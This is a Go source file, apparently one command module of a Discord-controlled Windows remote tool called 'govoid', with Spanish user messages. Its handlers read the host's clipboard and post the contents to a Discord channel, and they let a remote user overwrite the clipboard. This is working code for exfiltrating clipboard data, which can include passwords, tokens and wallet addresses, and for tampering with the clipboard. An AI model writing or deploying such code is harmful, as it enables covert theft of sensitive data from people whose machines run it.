//go:build windows

package commands

import (
	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/win32"
)

func Clipboard(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}

	switch StringOption(i, "action") {
	case "get":
		sendClipboard(s, i)

	case "set":
		text := StringOption(i, "text")
		if isBlank(text) {
			Finish(s, i, "❌ Falta el texto a escribir.")
			return
		}
		if err := win32.SetClipboardText(text); err != nil {
			Finish(s, i, "❌ "+err.Error())
			return
		}
		Finish(s, i, "✅ Portapapeles actualizado.")

	default:
		Finish(s, i, "❌ Acción inválida. Usa get o set.")
	}
}

func ClipboardGet(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}
	sendClipboard(s, i)
}

func sendClipboard(s *discordgo.Session, i *discordgo.InteractionCreate) {
	text, err := win32.GetClipboardText()
	if err != nil {
		Finish(s, i, "❌ "+err.Error())
		return
	}
	if text == "" {
		Finish(s, i, "📋 Portapapeles vacío.")
		return
	}
	Finish(s, i, "📋 **Portapapeles:**\n"+text)
}
